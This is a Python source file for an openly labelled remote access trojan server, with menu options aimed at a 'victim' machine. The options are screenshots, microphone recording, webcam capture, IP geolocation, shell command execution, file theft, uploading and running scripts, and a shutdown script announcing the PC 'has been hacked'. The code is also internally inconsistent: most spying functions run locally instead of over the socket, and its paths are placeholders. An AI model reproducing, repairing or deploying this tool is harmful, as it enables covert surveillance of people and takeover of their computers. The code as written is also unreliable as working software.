import os
import subprocess
import shutil
import pyscreenshot
import pyaudio
import wave
import cv2
import geocoder
import socket
import time
import threading
import signal

# Global variables
HOST = '192.168.137.1'
PORT = 1234

# Color codes
COLOR_GREEN = '\033[92m'
COLOR_RED = '\033[91m'
COLOR_CYAN = '\033[96m'
COLOR_YELLOW = '\033[93m'

# ASCII cat
CAT_ASCII = """
⠀ ／l、
（ﾟ､ ｡ ７
⠀ l、ﾞ ~ヽ
  じしf_, )ノ
"""

def colored_print(msg, color):
    """Print colored message."""
    print(color + msg + '\033[0m')

def show_loading_screen():
    """Display loading screen with ASCII art."""
    print(COLOR_YELLOW + CAT_ASCII)
    print(COLOR_CYAN + "Press Ctrl + C to stop the script.")

def take_screenshot():
    """Capture and save a screenshot."""
    try:
        screenshot = pyscreenshot.grab()
        screenshot.save('screenshot.jpg')
        colored_print("Screenshot captured successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to capture screenshot: {e}", COLOR_RED)

def record_audio():
    """Record audio from the microphone."""
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10
        WAVE_OUTPUT_FILENAME = "output.wav"

        audio = pyaudio.PyAudio()

        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
        colored_print("Audio recorded successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to record audio: {e}", COLOR_RED)

def capture_camera():
    """Capture an image from the camera."""
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        cv2.imwrite("camera_capture.jpg", frame)
        camera.release()
        colored_print("Camera capture successful.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to capture camera: {e}", COLOR_RED)

def get_gps_location():
    """Get GPS location based on IP address."""
    try:
        g = geocoder.ip('me')
        if g.ok:
            latitude, longitude = g.latlng
            output = f"{latitude}, {longitude}"
            with open("gps_location.txt", "w") as f:
                f.write(output)
            colored_print(output, COLOR_CYAN)
        else:
            colored_print("Failed to get GPS location.", COLOR_RED)
    except Exception as e:
        colored_print(f"Failed to get GPS location: {e}", COLOR_RED)

def execute_command():
    """Execute shell command."""
    try:
        while True:
            command = input("Command: ")
            if command.lower() == 'exit':
                break
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            colored_print(result.stdout, COLOR_GREEN)
            colored_print(result.stderr, COLOR_RED)
    except Exception as e:
        colored_print(f"Error executing command: {e}", COLOR_RED)

def transfer_files():
    """Transfer files."""
    try:
        # Example: Transfer all .txt files from victim to attacker
        files = os.listdir('.')
        for file in files:
            if file.endswith('.txt'):
                shutil.copy(file, '/path/to/attacker')
        colored_print("Files transferred successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to transfer files: {e}", COLOR_RED)

def upload_script(file_path):
    """Upload a script to victim's machine."""
    try:
        # Example: Upload a script specified by the attacker to victim's machine
        shutil.copy(file_path, '/path/to/victim')
        colored_print("Script uploaded successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to upload script: {e}", COLOR_RED)

def execute_uploaded_script(script_path):
    """Execute the uploaded script on victim's machine."""
    try:
        # Example: Execute the uploaded script specified by the attacker on victim's machine
        subprocess.run(['python', script_path])
        colored_print("Script executed successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to execute script: {e}", COLOR_RED)

def initiate_shutdown(countdown_time):
    """Initiate system shutdown with a custom countdown."""
    try:
        # Create a .bat file to initiate shutdown with a custom countdown message and time
        with open("shutdown.bat", "w") as f:
            f.write(f'@echo off\n')
            f.write(f'echo Your PC has been hacked By Dokkaebi. Goodnight.\n')
            f.write(f'echo Countdown {countdown_time}\n')
            f.write(f'shutdown /s /t {countdown_time}\n')
        colored_print("Shutdown script created successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to create shutdown script: {e}", COLOR_RED)

def send_menu_options():
    """Display menu options for the attacker."""
    menu_options = (
        "Menu Options:\n"
        "1. Take screenshot\n"
        "   - Capture and save a screenshot.\n"
        "2. Save passwords\n"
        "   - Not implemented yet.\n"
        "3. Record audio\n"
        "   - Record audio from the microphone.\n"
        "4. Capture camera\n"
        "   - Capture an image from the camera.\n"
        "5. Get GPS location\n"
        "   - Get GPS location based on IP address.\n"
        "6. Execute command\n"
        "   - Execute shell command.\n"
        "7. Transfer files\n"
        "   - Transfer files from victim to attacker.\n"
        "8. Upload script\n"
        "   - Upload a script to victim's machine.\n"
        "9. Execute uploaded script\n"
        "   - Execute the uploaded script on victim's machine.\n"
        "10. Initiate shutdown [time]\n"
        "   - Initiate system shutdown with a custom countdown.\n"
    )
    print(menu_options)

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        self.client = None

    def build_connection(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            show_loading_screen()  # Display loading screen before waiting for the client
            print("[*] Waiting for the client...")
            self.client, addr = self.server.accept()
            ipcli = self.client.recv(1024).decode()
            print(f"[*] Connection is established successfully with {ipcli}\n")
            print("Sending menu options to the attacker...")
            send_menu_options()  # Display menu options for the attacker after connection is established
        except Exception as e:
            print(f"Error building connection: {e}")

    def execute_command(self, command):
        try:
            self.client.send(command.encode())
            result_output = self.client.recv(1024).decode()
            print(result_output)
        except Exception as e:
            print(f"Error executing command: {e}")

    def send_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                self.client.send(file_data)
        except Exception as e:
            print(f"Error sending file: {e}")

    def receive_file(self, save_path):
        try:
            file_data = self.client.recv(2147483647)
            with open(save_path, 'wb') as f:
                f.write(file_data)
        except Exception as e:
            print(f"Error receiving file: {e}")

    def execute(self):
        try:
            while True:
                rat_command = input("Command >> ")
                if rat_command == '1':
                    take_screenshot()
                elif rat_command == '2':
                    # Save passwords (implement this function)
                    pass
                elif rat_command == '3':
                    record_audio()
                elif rat_command == '4':
                    capture_camera()
                elif rat_command == '5':
                    get_gps_location()
                elif rat_command == '6':
                    execute_command()
                elif rat_command == '7':
                    transfer_files()
                elif rat_command == '8':
                    file_path = input("Enter the path of the script to upload: ")
                    upload_script(file_path)
                elif rat_command == '9':
                    script_path = input("Enter the name of the script to execute: ")
                    execute_uploaded_script(script_path)
                elif rat_command.startswith('10 '):
                    # Extract countdown time from the command
                    countdown_time = rat_command.split(' ')[1]
                    initiate_shutdown(countdown_time)
                else:
                    print("Invalid command. Please enter a number from the menu options.")
        except KeyboardInterrupt:
            print("\nExiting...")
            if self.client:
                self.client.close()
            if self.server:
                self.server.close()

if __name__ == "__main__":
    rat = RAT_SERVER(HOST, PORT)
    rat.build_connection()
    rat.execute()
